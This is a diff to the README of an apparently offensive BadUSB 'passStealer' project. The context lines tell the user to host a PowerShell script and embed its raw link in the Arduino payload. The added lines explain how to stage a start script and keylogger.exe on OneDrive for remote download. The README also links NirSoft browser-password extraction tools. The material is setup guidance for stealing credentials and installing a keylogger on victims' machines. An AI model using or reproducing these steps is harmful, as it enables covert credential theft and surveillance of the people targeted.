@@ -77,6 +77,12 @@ cd BadUSB_passStealer
 4. Go to the ciaoV2.ps1 page and click on RAW button;
 
 5. Copy the link of the RAW page and put it in the [BadUSB_passStealer.ino](https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/BadUSB_passStealer.ino) file;
+## One Drive
+1. Create a One Drive account [here](https://signup.live.com/signup);
+
+2. Upload startScript.ps1 and keylogger.exe file;
+
+3. Follow this [tutorial](https://mangolassi.it/topic/19276/how-to-configure-a-onedrive-file-for-use-with-wget)
 # Nirsoft tools 🧰
 You can download nirsoft tools below if you want :
 * [WebBrowserPassView.exe](https://www.nirsoft.net/protected_downloads/passreccommandline.zip) (User : download ; Password : nirsoft123!);
